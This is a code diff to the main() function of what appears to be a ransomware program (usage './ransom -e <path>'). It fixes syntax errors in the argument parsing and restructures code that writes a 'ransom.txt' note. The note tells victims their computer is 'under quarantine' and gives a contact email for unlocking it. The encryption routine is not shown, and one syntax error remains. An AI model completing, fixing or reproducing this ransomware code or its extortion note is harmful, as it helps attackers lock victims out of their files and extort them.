@@ -180,7 +180,7 @@ int main (int argc, char * argv[])
 
     //Get Arguments
     if (argc > 1) {
-        if (!strcmp(argv[1],"-e") {
+        if (!strcmp(argv[1],"-e")) {
             if (argc != 3) {
                 printf("Do something more like ./ransom -e <path>\n");
                 return 0;
@@ -217,7 +217,7 @@ int main (int argc, char * argv[])
             }
         }
     }
-    else if (!strcmp(argv[1],"-h") {
+    else if (!strcmp(argv[1],"-h")) {
         usage();
         return 0
     }
@@ -233,21 +233,20 @@ int main (int argc, char * argv[])
 
 
 
-        //Ransom Letter - Cannot be written if we encrypt the whole machine (should put a condition not to encrypt ransom.txt after having created it)
-        FILE* fichier = NULL;
-        int currentchar = 0;
-        fichier = fopen("ransom.txt", "w");
+    //Ransom Letter - Cannot be written if we encrypt the whole machine (should put a condition not to encrypt ransom.txt after having created it)
+    FILE* fichier = NULL;
+    int currentchar = 0;
+    fichier = fopen("ransom.txt", "w");
 
-        if (fichier != NULL)
-        {
-            fputs("Your Computer has been intercepted and placed under quarantine\nPlease contact us at the following address to have access to your machine unlocked:\n getpowned@yahoo.fr", fichier);
+    if (fichier != NULL)
+    {
+        fputs("Your Computer has been intercepted and placed under quarantine\nPlease contact us at the following address to have access to your machine unlocked:\n getpowned@yahoo.fr", fichier);
 
-            fclose(fichier);
-        }
-
-        return 0;
+        fclose(fichier);
     }
 
+    return 0;
 }
+
 // to do Gestion des fichiers volumineux avec - st_size  #include <sys/stat.h> & #include <time.h>  https://linux.die.net/man/2/stat
 
